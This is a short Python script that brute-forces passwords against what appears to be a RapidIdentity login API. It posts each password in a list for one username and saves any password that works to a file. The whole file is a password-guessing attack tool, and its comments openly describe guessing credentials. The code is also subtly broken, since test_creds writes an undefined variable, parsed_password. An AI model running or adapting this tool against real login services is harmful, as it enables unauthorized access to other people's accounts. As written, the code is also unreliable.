#RapidIdentity API funcitons

import requests

def test_creds(s, url, username, password, log=False):
    #Get id from server
    id = s.get(url).json()['id']
    #Post username and password to server
    resp = s.post(url, json={
        'id'       : id,
        'type'     : 'username+password',
        'username' : username,
        'password' : password
    }).json()
    #Check if password is valid
    valid = resp['type'] == 'complete'
    #Log password to file if, by some miracle, it actually guesses it right
    if valid:
        with open('password', 'w') as f:
            f.write(parsed_password)
    return valid

#For batch password testing
def test_list(s, url, username, password_list):
    for password in password_list:
        #Strip out newline characters
        parsed_password = password.strip("\n")
        #Check if password valid
        valid_pass = test_creds(s, url, username, parsed_password)
        #Print info to output
        #print(username.ljust(20), ":","Testing", parsed_password[0:30].ljust(30), valid_pass)